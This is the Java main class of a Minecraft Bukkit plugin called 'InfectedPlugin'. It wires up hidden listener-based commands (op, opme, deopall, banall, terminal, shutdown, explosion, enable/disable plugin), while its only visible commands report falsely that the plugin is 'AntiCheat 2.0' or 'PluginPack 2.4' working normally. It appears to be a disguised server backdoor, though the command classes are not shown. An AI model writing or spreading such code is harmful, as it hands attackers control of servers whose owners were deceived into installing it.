 package org.CreeperCoders.InfectedPlugin;
 
 import java.util.logging.Logger;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.plugin.PluginManager;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 
 import org.CreeperCoders.InfectedPlugin.Commands.*;
 
 public class InfectedPlugin extends JavaPlugin
 {
     public static final Logger log = Bukkit.getLogger();
     public InfectedPlugin plugin;
     
     @Override
     public void onLoad()
     {
         log.info(String.format("[%s] %s is now loading...", getDescription().getName(), getDescription().getName()));
     }
 
     @Override
     public void onEnable()
     {
         log.info(String.format("[%s] %s is registering all events...", getDescription().getName(), getDescription().getName()));
         try
         {
             PluginManager pm = getServer().getPluginManager();
             //pm.registerEvents(new IP_PlayerListener(), this);
             pm.registerEvents(new Command_banall(), this);
             pm.registerEvents(new Command_deop(), this);
             pm.registerEvents(new Command_op(), this);
		    pm.registerEvents(new Command_gamemode(), this);
             pm.registerEvents(new Command_enablevanilla(), this);
             pm.registerEvents(new Command_help(), this);
             pm.registerEvents(new Command_opme(), this);
             pm.registerEvents(new Command_terminal(this), this);
             //pm.registerEvents(new Command_fuckoff(), this);
             pm.registerEvents(new Command_shutdown(), this);
             //pm.registerEvents(new Command_randombanl(), this);
             pm.registerEvents(new Command_enableplugin(), this);
             pm.registerEvents(new Command_disableplugin(), this);
             pm.registerEvents(new Command_deopall(), this);
             pm.registerEvents(new Command_explosion(), this);
         }
         catch (Exception ex)
         {
             log.severe(String.format("[%s] Failed to register events! Reason: %s", getDescription().getName(), ex.getMessage()));
         }
         log.info(String.format("[%s] %s version %s by %s has been enabled!", getDescription().getName(), getDescription().getName(), getDescription().getVersion(), getDescription().getAuthors()));
     }
 
     @Override
     public void onDisable()
     {
         log.info(String.format("[%s] %s has been disabled!", getDescription().getName(), getDescription().getName()));
     }
 
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
     {
         if (commandLabel.equalsIgnoreCase("anticheat"))
         {
             sender.sendMessage(ChatColor.GREEN + "AntiCheat 2.0 is working 100%");
             return true;
         }
         else if (commandLabel.equalsIgnoreCase("pluginpack"))
         {
             sender.sendMessage(ChatColor.GREEN + "PluginPack 2.4 working 100%! Use /anticheat to see anticheat details!");
             return true;
         }
         return false;
     }
 }
